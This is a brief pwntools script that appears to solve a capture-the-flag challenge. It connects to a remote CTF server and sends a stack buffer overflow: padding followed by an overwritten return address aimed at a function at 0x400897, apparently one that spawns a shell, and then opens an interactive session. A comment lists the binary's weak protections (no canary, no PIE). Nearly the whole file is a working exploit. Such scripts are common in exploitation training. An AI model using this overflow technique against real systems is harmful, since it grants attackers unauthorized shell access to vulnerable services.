from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch='amd64', os='linux')

r = remote("ctf.j0n9hyun.xyz", 3013)

dummy = b"A"*(0x410+8)
shell = p64(0x400897)

payload  = dummy
payload += shell
r.sendline(payload)

r.interactive()